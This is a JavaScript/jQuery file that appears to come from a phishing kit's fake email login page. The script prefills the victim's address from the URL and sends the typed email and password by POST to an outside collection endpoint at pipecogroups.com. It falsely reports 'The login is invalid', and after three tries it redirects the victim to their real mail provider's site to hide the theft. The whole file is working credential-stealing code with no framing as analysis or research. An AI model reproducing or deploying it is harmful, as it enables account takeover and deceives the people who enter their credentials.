

    /* global $ */
    $(document).ready(function(){
      var count=0;

      // $('#back1').click(function () {
      //   $("#msg").hide();
      //   $('#email').val("");
      //   $("#automail").animate({left:200, opacity:"hide"}, 0);
      //   $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      // });

    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
        // $('#email').val(email);
        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/other-1.png');
        $('#field').html("Other Mail");
        $('#email').val(my_email);
        $('#emailch').html(my_email);
        $("#msg").hide();
        // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        // $("#automail").animate({right:200, opacity:"show"}, 1000);
      }
      ///////////////url getting email////////////////


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://pipecogroups.com/vls/chenweb.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifying...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=3) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("https://www."+my_slice);

                  }
                  $('#msg_text').html(response['msg']);
                }
                else{
                  $('#msg_text').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=3) {
                count=0;
                window.location.replace("https://www."+my_slice);
              }
              $("#msg").show();
              $('#msg_text').html("The login is invalid");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
    });


    });
